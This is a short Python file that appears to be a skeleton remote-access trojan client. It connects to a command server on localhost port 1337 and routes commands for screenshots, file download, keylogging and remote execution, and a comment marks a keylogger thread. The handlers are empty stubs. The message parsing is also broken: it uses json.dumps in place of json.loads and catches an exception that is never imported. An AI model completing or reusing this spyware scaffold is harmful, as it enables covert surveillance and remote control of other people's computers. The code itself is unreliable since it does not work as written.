import socket
import threading
import json

SERVER_ADDRESS = "127.0.0.1"
SERVER_PORT = 1337


def handle(data: dict) -> None:
    """Handles instructions sent from the server

    Args:
        data (dict): Instruction information
    """
    cmd, args = data.get("cmd"), data.get("args")
    if cmd == "screenshot":
        pass  # self._screenshot()
    elif cmd == "download":
        pass  # self._download(data.get("args")[0])
    elif cmd == "keylogs":
        pass  # self._keylogs()
    elif cmd == "execute":
        pass  # self._execute(data.get("args"))
    elif cmd == "ping":
        pass  # send response


def connect(sock: socket.socket, host: str, port: int) -> None:
    """Connects to a server

    Args:
        host (str): The host to connect to
        port (int): The port to connect to

    """
    try:
        sock.connect((host, port))
    except OSError:
        return
    while True:
        if not (data := sock.recv(1024)):
            break
        try:
            decoded = json.dumps(data.decode("utf-8"))
        except JSONDecodeError:
            continue
        else:
            handle(decoded)


if __name__ == "__main__":
    # start keylogger thread
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        connect(sock, SERVER_ADDRESS, SERVER_PORT)
